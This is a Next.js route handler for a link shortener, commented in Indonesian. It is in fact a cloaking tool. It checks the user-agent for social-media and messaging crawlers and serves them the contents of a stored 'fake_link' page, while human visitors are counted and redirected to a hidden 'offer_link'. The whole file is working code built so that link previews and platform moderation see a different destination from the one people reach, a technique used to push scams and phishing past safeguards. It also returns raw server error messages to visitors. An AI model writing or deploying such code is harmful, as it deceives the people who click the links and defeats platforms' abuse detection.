import { turso } from "@/lib/turso";
import { NextResponse } from "next/server";

function formatUrl(domainStr) {
  if (!domainStr) return "https://google.com"; // Fallback aman
  const cleanStr = domainStr.trim();
  if (!cleanStr.startsWith('http://') && !cleanStr.startsWith('https://')) {
    return `https://${cleanStr}`;
  }
  return cleanStr;
}

// Gunakan props alih-alih destructuring params langsung untuk kompatibilitas Next.js 15
export async function GET(request, props) {
  try {
    // FIX NEXT.JS 15: params harus di-await
    const params = await props.params;
    const shortcode = params.shortcode;
    const userAgent = request.headers.get("user-agent") || "";
    
    const isBot = /bot|facebookexternalhit|whatsapp|twitterbot|linkedinbot|pinterest|skype|telegram|vkshare|slackbot|discordbot/i.test(userAgent);

    // 1. Cek database
    const result = await turso.execute({
      sql: "SELECT * FROM links WHERE short_code = ?",
      args: [shortcode]
    });

    if (result.rows.length === 0) {
      return NextResponse.redirect(new URL("/404", request.url));
    }

    const data = result.rows[0];
    const fakeTarget = formatUrl(data.fake_link);
    const offerTarget = formatUrl(data.offer_link);

    // 2. Logika Skenario
    if (isBot) {
      try {
        const response = await fetch(fakeTarget);
        const htmlContent = await response.text();
        return new NextResponse(htmlContent, {
          status: 200,
          headers: { "Content-Type": "text/html; charset=utf-8" }
        });
      } catch (fetchError) {
        return NextResponse.redirect(fakeTarget, 301);
      }
    } else {
      // Update klik (Manusia)
      await turso.execute({
        sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
        args: [shortcode]
      });

      return NextResponse.redirect(offerTarget, 302);
    }

  } catch (error) {
    // INI PENTING: Jika gagal, tampilkan pesan aslinya ke layar agar mudah diperbaiki
    return new NextResponse("SERVER ERROR: " + error.message, { 
      status: 500,
      headers: { "Content-Type": "text/plain" }
    });
  }
}
